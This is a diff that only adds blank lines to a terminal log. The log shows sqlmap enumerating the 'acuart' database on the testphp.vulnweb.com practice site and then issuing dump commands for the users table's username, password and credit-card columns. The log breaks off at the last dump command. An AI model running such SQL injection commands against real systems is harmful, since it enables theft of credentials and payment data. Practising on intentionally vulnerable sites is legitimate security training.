@@ -6,6 +6,7 @@
 '/home/allen/.local/share/sqlmap/output/testphp.vulnweb.com' 
 [*] ending @ 23:56:38 /2025-08-23/ 
 
+
 └─$ sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart --tables
 [23:57:48] [INFO] fetching tables for database: 'acuart' 
 Database: acuart 
@@ -23,6 +24,7 @@ Database: acuart
 [23:57:48] [INFO] fetched data logged to text files under
 '/home/allen/.local/share/sqlmap/output/testphp.vulnweb.com'
 [*] ending @ 23:57:48 /2025-08-23/ 
+
 
 └─$ sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart --tables users --columns
 [23:58:53] [INFO] fetching tables for database: 'acuart'
@@ -133,6 +135,7 @@ Table: featured
 '/home/allen/.local/share/sqlmap/output/testphp.vulnweb.com'
 [*] ending @ 23:58:56 /2025-08-23/ 
 
+
 └─$ sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users C uname --dump
 [00:00:05] [INFO] fetching entries of column(s) 'uname' for table 'users' in database 'acuart'
 Database: acuart
@@ -149,6 +152,7 @@ Table: users
 '/home/allen/.local/share/sqlmap/output/testphp.vulnweb.com' 
 [*] ending @ 00:00:06 /2025-08-24/ 
 
+
 └─$ sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users C pass --dump 
 [00:00:46] [INFO] fetching entries of column(s) 'pass' for table 'users' in database 'acuart' 
 Database: acuart
@@ -164,6 +168,7 @@ Table: users
 [00:00:47] [INFO] fetched data logged to text files under
 '/home/allen/.local/share/sqlmap/output/testphp.vulnweb.com'
 [*] ending @ 00:00:47 /2025-08-24/ 
+
 
 └─$ sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users C cc --dump 
 [00:01:13] [INFO] fetching entries of column(s) 'cc' for table 'users' in database 'acuart'
